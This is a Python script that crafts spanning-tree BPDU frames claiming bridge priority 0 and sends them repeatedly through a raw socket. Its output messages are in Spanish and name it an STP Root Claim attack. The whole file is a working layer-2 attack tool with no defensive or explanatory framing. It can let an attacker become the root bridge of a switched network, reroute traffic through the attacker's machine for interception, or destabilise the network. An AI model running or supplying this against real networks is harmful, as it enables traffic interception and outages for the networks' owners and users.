#!/usr/bin/env python3
import socket
import struct
import random
import time
import sys
import binascii

STP_MULTICAST = b'\x01\x80\xc2\x00\x00\x00'

def get_local_mac(iface):
    try:
        import fcntl
        import array
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface.encode()[:15]))
        return info[18:24]
    except:
        return bytes([0x50, 0x4a, 0x9d, 0x00, 0x02, 0x00])

def build_stp_bpdu(bridge_mac, priority=0, port_id=0x8001, hello_time=2, max_age=20, fwd_delay=15):
    llc = bytes([0x42, 0x42, 0x03])
    
    proto_id = 0x0000
    version = 0x00
    bpdu_type = 0x00
    flags = 0x00
    
    root_priority = priority
    root_mac = bridge_mac
    root_path_cost = 0
    bridge_priority = priority
    bridge_id = bridge_mac
    port_id_val = port_id
    message_age = 0
    
    hello_time_256 = int(hello_time * 256)
    max_age_256 = int(max_age * 256)
    fwd_delay_256 = int(fwd_delay * 256)
    
    stp_pkt = struct.pack('!HHBB', proto_id, version, bpdu_type, flags)
    stp_pkt += struct.pack('!H', root_priority) + root_mac
    stp_pkt += struct.pack('!I', root_path_cost)
    stp_pkt += struct.pack('!H', bridge_priority) + bridge_id
    stp_pkt += struct.pack('!H', port_id_val)
    stp_pkt += struct.pack('!HHHH', message_age, max_age_256, hello_time_256, fwd_delay_256)
    
    eth_dst = STP_MULTICAST
    eth_src = bridge_mac
    frame = eth_dst + eth_src + struct.pack('!H', len(stp_pkt) + 3) + llc + stp_pkt
    
    return frame

def send_stp_bpdu(iface, bridge_mac, count=50):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((iface, 0))
        
        print(f"Enviando {count} BPDUs STP (Root Claim) por {iface}")
        print(f"Bridge-ID: 0/{binascii.hexlify(bridge_mac).decode()}")
        
        for i in range(count):
            pkt = build_stp_bpdu(bridge_mac)
            sock.send(pkt)
            if (i+1) % 10 == 0:
                print(f"  Enviados: {i+1}/{count}")
            time.sleep(2)
        
        sock.close()
        print("✅ Ataque STP Root Claim completado")
        
    except PermissionError:
        print("Error: Ejecutar con sudo")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    iface = 'ens3'
    count = 30
    
    if len(sys.argv) > 2:
        iface = sys.argv[2]
    if len(sys.argv) > 4:
        count = int(sys.argv[4])
    
    bridge_mac = get_local_mac(iface)
    send_stp_bpdu(iface, bridge_mac, count)
